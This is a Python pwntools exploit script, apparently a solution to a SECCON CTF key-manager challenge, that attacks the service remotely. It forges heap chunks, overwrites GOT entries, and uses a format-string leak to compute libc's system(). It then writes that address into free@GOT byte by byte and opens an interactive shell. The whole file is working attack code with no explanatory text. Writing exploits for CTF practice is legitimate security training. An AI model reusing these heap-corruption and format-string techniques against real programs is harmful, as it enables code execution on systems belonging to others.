from pwn import *

# p = process('./key')
p = remote('secure_keymanager.pwn.seccon.jp', 47225)

fake_chunk = p64(0)
fake_chunk += p64(0x51)
acct_ = fake_chunk
pass_ = 'babo'

p.recvuntil('>> ')
p.send(acct_)
p.recvuntil('>> ')
p.sendline(pass_)

def menu():
    p.recvuntil('>> ')

def add_key(length, title, key):
    menu()
    p.sendline('1')

    p.recvuntil('...')
    p.sendline(str(length))

    p.recvuntil('...')
    p.sendline(title)

    p.recvuntil('...')
    p.sendline(key)

def del_key(idx):
    menu()
    p.sendline('4')

    p.recvuntil('>> ')
    p.send(acct_)
    p.recvuntil('>> ')
    p.sendline(pass_)

    p.recvuntil('...')
    p.sendline(str(idx))

def edit_key(idx, key):
    menu()
    p.sendline('3')

    p.recvuntil('>> ')
    p.send(acct_)
    p.recvuntil('>> ')
    p.sendline(pass_)
    
    p.recvuntil('...')
    p.sendline(str(idx))

    p.recvuntil('...')
    p.sendline(key)

add_key(0x80, 'A' * 0x10, 'A') # 0
add_key(0x80, 'B' * 0x10, 'B') # 1
add_key(0x80, 'C' * 0x10, 'C') # 2

del_key(0)
del_key(1)

payload = 'A' * (0xb0 - 0x30)
payload += p64(0x0) + p64(0x51) 
payload += p64(0x0) + p64(0x0)
payload += p64(0x0) + p64(0x0)
payload += p64(0x0) + p64(0x0)
payload += p64(0x0) + p64(0x0)
payload += p64(0x0) + p64(0x51)
add_key(0x120, 'D' * 0x10, payload) # 0

del_key(1)

acct_addr = 0x6020c0
payload = 'A' * (0xb0 - 0x30)
payload += p64(0x0) + p64(0x51) 
payload += p64(acct_addr) + p64(0x0)
payload += p64(0x0) + p64(0x0)
payload += p64(0x0) + p64(0x0)
payload += p64(0x0) + p64(0x0)
payload += p64(0x0) + p64(0x51)
edit_key(0, payload)

read_got = 0x602050
free_got = 0x602018
atoi_got = 0x602070
setbuf_got = 0x602030
add_key(0x20, 'D' * 0x10, 'D') # 1
add_key(0x20, '/bin/sh\x00' * 2 + p64(setbuf_got), 'E' * 0x10) # 3

setbuf_plt = 0x4006d0
strchr_plt = 0x4006e0
printf_plt = 0x4006f0
size_plt = 0x400700
read_plt = 0x400710
start_plt = 0x400720
strcmp_plt = 0x400730
malloc_plt = 0x400740
atoi_plt = 0x400750

'''
.got.plt:0000000000602018 off_602018      dq offset free          ; DATA XREF: _freer
.got.plt:0000000000602020 off_602020      dq offset puts          ; DATA XREF: _putsr
.got.plt:0000000000602028 off_602028      dq offset __stack_chk_fail
.got.plt:0000000000602028                                         ; DATA XREF: ___stack_chk_failr
.got.plt:0000000000602030 off_602030      dq offset setbuf        ; DATA XREF: _setbufr
.got.plt:0000000000602038 off_602038      dq offset strchr        ; DATA XREF: _strchrr
.got.plt:0000000000602040 off_602040      dq offset printf        ; DATA XREF: _printfr
.got.plt:0000000000602048 off_602048      dq offset malloc_usable_size
.got.plt:0000000000602048                                         ; DATA XREF: _malloc_usable_sizer
.got.plt:0000000000602050 off_602050      dq offset read          ; DATA XREF: _readr
.got.plt:0000000000602058 off_602058      dq offset __libc_start_main
.got.plt:0000000000602058                                         ; DATA XREF: ___libc_start_mainr
.got.plt:0000000000602060 off_602060      dq offset strcmp        ; DATA XREF: _strcmpr
.got.plt:0000000000602068 off_602068      dq offset malloc        ; DATA XREF: _mallocr
.got.plt:0000000000602070 off_602070      dq offset atoi          ; DATA XREF: _atoir
'''

menu()
p.sendline('3')
p.recvuntil('>> ')
p.send(acct_)
p.recvuntil('>> ')
p.sendline(pass_)
p.recvuntil('...')
p.sendline('0')
p.recvuntil('...')
payload = p64(0x400716)
payload += p64(start_plt)
payload += p64(0x400736)
payload += p64(0x400746)
payload += p64(printf_plt)
# raw_input('wait')
p.send(payload)

menu()
p.sendline('%7$s----' + p64(read_got))
leak = u64(p.recvuntil('-', drop=True).ljust(8, '\x00'))
print hex(leak)
libc_base = leak - 0xf7220
system = libc_base + 0x45390
start_addr = free_got
for i in xrange(6):
    menu()
    bit = system & 0xff
    payload = '%' + str(bit) + 'c' + '%8$hhn'
    payload = payload.ljust(0x10, '-')
    payload += p64(start_addr)
    start_addr += 1
    system = system >> 8
    p.sendline(payload)

menu()
p.sendline('aaaa') # 4
p.recvuntil('>> ')
p.send(acct_)
p.recvuntil('>> ')
p.sendline(pass_)
p.recvuntil('...')
p.sendline('aaa')

# edit_key(0, 'A' * 0x8)

'''
menu()
p.sendline('2')
p.recvuntil('>> ')
p.send(acct_)
p.recvuntil('>> ')
p.sendline(pass_)
'''

p.interactive()



    
    

